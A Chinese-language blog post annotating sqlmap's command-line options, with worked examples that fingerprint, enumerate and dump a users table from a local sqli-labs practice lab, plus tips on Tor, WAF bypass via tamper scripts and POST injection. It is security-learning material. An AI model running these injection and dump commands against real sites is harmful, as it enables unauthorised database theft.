---
title: sqlmap
date: 2018-08-28 15:30:54
tags: [sql注入]
---
使用sqlmap需要自己先找到注入点
## 1.sqlmap 用户文档
用户文档来自 https://blog.csdn.net/u012763794/article/details/52638931</br>
-v VERBOSE 输出信息的详细程度
	# Verbosity level.
	# Valid: integer between 0 and 6
	# 0: Show only error and critical messages  只显示错误和关键信息
	# 1: Show also warning and info messages    警告和信息
	# 2: Show also debug messages               调试信息
	# 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)',(..)"("
	# 4: Show also HTTP requests                整个GET报文都看到了
	# 5: Show also HTTP responses' headers         返回报文的头部
	# 6: Show also HTTP responses' page content    返回的html代码都有了
	# Default: 1
 Request: 请求
	These options can be used to specify how to connect to the target URL

	--method=METHOD     Force usage of given HTTP method (e.g. PUT)
		指定HTTP请求的方法，GET，POST，PUT，MOVE等
	--data=DATA         Data string to be sent through POST
		指定POST的参数
	--param-del=PARA..  Character used for splitting parameter values
		这个拆分一些参数的，如下面用;拆分post参数
		python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
	--cookie=COOKIE     HTTP Cookie header value
		指定cookie值
	--cookie-del=COO..  Character used for splitting cookie values
		指定分割cookie值的字符是什么
	--load-cookies=L..  File containing cookies in Netscape/wget format
		这个是从文件中读取cookie吧，Netscape/wget格式的
	--drop-set-cookie   Ignore Set-Cookie header from response
		忽略响应包的Set-Cookie头
	--user-agent=AGENT  HTTP User-Agent header value
		指定User-Agent用户代理
	--random-agent      Use randomly selected HTTP User-Agent header value
		随机选用sqlmap目录中的User-Agent，这个文件再txt目录
	--host=HOST         HTTP Host header value
		指定主机头
	--referer=REFERER   HTTP Referer header value
		指定Referer头，就是请求来源的意思
	-H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
		指定某个头部，如： -H "X-Forwarded-For: 127.0.0.1"
	--headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
		这个的话应该是可以指定多个，用\n分割
	--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
		指定http认证类型
	--auth-cred=AUTH..  HTTP authentication credentials (name:password)
		指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证
	--auth-file=AUTH..  HTTP authentication PEM cert/private key file
		指定一个私钥文件来认证
	--ignore-401        Ignore HTTP Error 401 (Unauthorized)
		忽略401错误
	--proxy=PROXY       Use a proxy to connect to the target URL
		指定代理
	--proxy-cred=PRO..  Proxy authentication credentials (name:password)
		指定代理的认证信息，就是账号密码
	--proxy-file=PRO..  Load proxy list from a file
		从文件中选择代理
	--ignore-proxy      Ignore system default proxy settings
		忽略系统默认代理
	--tor               Use Tor anonymity network
		使用tor网络
	--tor-port=TORPORT  Set Tor proxy port other than default
		设置tor的端口，如果不是默认端口的话
	--tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
		设置tor代理的类型
	--check-tor         Check to see if Tor is used properly
		检测tor能不能用
	--delay=DELAY       Delay in seconds between each HTTP request
		设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过
	--timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
		设置超时时间，默认30秒
	--retries=RETRIES   Retries when the connection timeouts (default 3)
		设置重试的次数，默认3次
	--randomize=RPARAM  Randomly change value for given parameter(s)
		随机地更改给定参数的值
	--safe-url=SAFEURL  URL address to visit frequently during testing
		有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求
		这里提供一个安全不错误的连接，每隔一段时间都会去访问一下
	--safe-post=SAFE..  POST data to send to a safe URL
		这里设置一个正确的post数据
	--safe-req=SAFER..  Load safe HTTP request from a file
		从文件中读取安全，或者叫正确的http请求
	--safe-freq=SAFE..  Test requests between two visits to a given safe URL
		设置访问安全url的时间间隔
	--skip-urlencode    Skip URL encoding of payload data
		不进行url编码
	--csrf-token=CSR..  Parameter used to hold anti-CSRF token
		设置CSRF的token
	--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token

	--force-ssl         Force usage of SSL/HTTPS
		强制使用https
	--hpp               Use HTTP parameter pollution method
		尝试了一下，只能用于ASP，得到报错信息如下：
		[WARNING] HTTP parameter pollution should work only against ASP(.NET) targets

	--eval=EVALCODE     Evaluate provided Python code before the request (e.g.
						"import hashlib;id2=hashlib.md5(id).hexdigest()")
		发送请求之前，先运行这段python代码，比如对某个参数进行处理
		比如下面的，hash参数就是id的md5值
		python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc
    509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

Fingerprint:</br>
-f, --fingerprint   Perform an extensive DBMS version fingerprint
	这个应该是数据库指纹识别，加了可能识别更好</br>

Enumeration:</br>
These options can be used to enumerate the back-end database
management system information, structure and data contained in the
tables. Moreover you can run your own SQL statements</br>
-a, --all           Retrieve everything</br>
	检索所有，这是拖库的节奏啊</br>
-b, --banner        Retrieve DBMS banner</br>
	检索数据库的一些标志性的信息，就是指纹这样子吧</br>
--current-user      Retrieve DBMS current user</br>
	检索当前连接数据库的用户</br>
--current-db        Retrieve DBMS current database</br>
	检索当前连接的数据库</br>
--hostname          Retrieve DBMS server hostname</br
	检索服务器的主机名</br>
--is-dba            Detect if the DBMS current user is DBA</br>
	检测是不是dba，就是root权限咯</br>
--users             Enumerate DBMS users</br>
	枚举数据库用户</br>
--passwords         Enumerate DBMS users password hashes</br>
	枚举数据库用户的哈希值</br>
--privileges        Enumerate DBMS users privileges</br>
	枚举数据库用户的权限</br>
--roles             Enumerate DBMS users roles</br>
	枚举数据库用户的角色</br>
--dbs               Enumerate DBMS databases</br>
	枚举数据库有哪些</br>
--tables            Enumerate DBMS database tables</br>
	枚举数据表名</br>
--columns           Enumerate DBMS database table columns</br>
	枚举列名</br>
--schema            Enumerate DBMS schema</br>
	这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</br>
--count             Retrieve number of entries for table(s)</br>
	枚举表格个数</br>
--dump              Dump DBMS database table entries</br>
	输出数据库表的数据</br>
--dump-all          Dump all DBMS databases tables entries</br>
	输出所有</br>
--search            Search column(s), table(s) and/or database name(s)</br>
	查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</br>
--comments          Retrieve DBMS comments</br>
	枚举数据库的注释</br>
-D DB               DBMS database to enumerate</br>
	指定数据库名</br>
-T TBL              DBMS database table(s) to enumerate</br>
	指定表名</br>
-C COL              DBMS database table column(s) to enumerate</br>
	指定列名</br>
-X EXCLUDECOL       DBMS database table column(s) to not enumerate</br>
	指定不枚举那个列</br>
-U USER             DBMS user to enumerate</br>
	枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</br>
--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</br>
	枚举时排除系统的数据库</br>
--pivot-column=P..  Pivot column name</br>
	以某一列为核心？这个用过没感觉出什么用</br>
--where=DUMPWHERE   Use WHERE condition while table dumping</br>
	使用where调试限制table的输出</br>
--start=LIMITSTART  First query output entry to retrieve</br>
	指定开始从第几行开始输出，如--start=3，前两行就不输出了</br>
--stop=LIMITSTOP    Last query output entry to retrieve</br>
	指定从第几行开始停止输出</br>
--first=FIRSTCHAR   First query output word character to retrieve</br>
	指定只输出第几个字符开始输出，盲注才有效，亲测</br>
--last=LASTCHAR     Last query output word character to retrieve</br>
	指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</br>
	如 ：--first 3 --last 5  只输出3到5位置的字符</br>
--sql-query=QUERY   SQL statement to be executed</br>
	指定执行我们的sql语句</br>
--sql-shell         Prompt for an interactive SQL shell</br>
	返回一个sql的shell</br>
--sql-file=SQLFILE  Execute SQL statements from given file(s)</br>
	从文件中读取执行sql语句</br>

## 二.实例
	1.sqlmap -u "http://127.0.0.1:80/sqli-labs/Less-1/?id=1" -b --is-dba --dbs
	查看指纹信息/是否dba(root权限)/数据库
	web server operating system: Linux Ubuntu
	web application technology: Apache 2.4.18
	back-end DBMS operating system: Linux Ubuntu
	back-end DBMS: MySQL 5.0
	banner:    '5.7.23-0ubuntu0.16.04.1'

	current user is DBA:    True

	available databases [6]:
	[*] challenges
	[*] information_schema
	[*] mysql
	[*] performance_schema
	[*] security
	[*] sys

	2.查看security下表名
	 sqlmap -u "http://127.0.0.1:80/sqli-labs/Less-1/?id=1" -D security --tables
	Database: security
	[4 tables]
	+----------+
	| emails   |
	| referers |
	| uagents  |
	| users    |
	+----------+

	3.查看列名
	sqlmap -u "http://127.0.0.1:80/sqli-labs/Less-1/?id=1" -D security -T users --columns

	Database: security
	Table: users
	[3 columns]
	+----------+-------------+
	| Column   | Type        |
	+----------+-------------+
	| id       | int(3)      |
	| password | varchar(20) |
	| username | varchar(20) |
	+----------+-------------+

	4.获得所有username
	sqlmap -u "http://127.0.0.1:80/sqli-labs/Less-1/?id=1" -D security -T users -C username --dump

	Database: security
	Table: users
	[16 entries]
	+-----------+
	| username  |
	+-----------+
	| admin     |
	| admin#    |
	| admin'#   |
	| admin1    |
	| admin2    |
	| admin3    |
	| admin4    |
	| admin\\'# |
	| Angelina  |
	| batman    |
	| dhakkan   |
	| Dumb      |
	| Dummy     |
	| secure    |
	| stupid    |
	| superman  |
	+-----------+

### 三.技巧等
	1.自动寻找注入点
	sqlmap -u "http://127.0.0.1:80/sqli-labs/Less-62/?id=1*" --batch
	如上，在可能的注入点后，加上*，将会自动寻找注入
	可以加上 --level n（1-5） 参数，越高越全面

	2.绕过WAF
	--tamper=TAMPER 使用给定的脚本（S）篡改注入数据

	3.post注入
	--data "id=1"
	或 抓取post数据包，保存为txt, -r参数读取文件 -p 要注入的参数
